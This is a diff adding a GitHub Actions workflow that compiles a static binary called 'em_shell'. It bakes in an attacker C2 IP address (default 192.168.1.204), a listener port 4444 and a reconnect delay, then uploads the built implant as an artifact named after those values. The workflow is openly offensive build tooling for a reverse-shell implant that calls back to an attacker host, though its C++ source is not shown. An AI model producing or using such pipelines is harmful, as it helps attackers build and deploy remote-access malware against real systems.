@@ -1,0 +1,45 @@
+name: Build em_shell
+
+on:
+  workflow_dispatch:
+    inputs:
+      attacker_ip:
+        description: "C2 IP address (attacker listener)"
+        required: true
+        default: "192.168.1.204"
+      attacker_port:
+        description: "C2 port (attacker listener)"
+        required: true
+        default: "4444"
+      retry_delay:
+        description: "Seconds between reconnect attempts"
+        required: false
+        default: "30"
+
+jobs:
+  build:
+    runs-on: ubuntu-22.04
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install dependencies
+        run: sudo apt-get install -y g++
+
+      - name: Compile em_shell
+        run: |
+          g++ \
+            -DATTACKER_IP='"${{ github.event.inputs.attacker_ip }}"' \
+            -DATTACKER_PORT=${{ github.event.inputs.attacker_port }} \
+            -DRETRY_DELAY=${{ github.event.inputs.retry_delay }} \
+            -static \
+            -o em_shell \
+            em_shell.cpp
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: em_shell-${{ github.event.inputs.attacker_ip }}-${{ github.event.inputs.attacker_port }}
+          path: em_shell
+          retention-days: 3
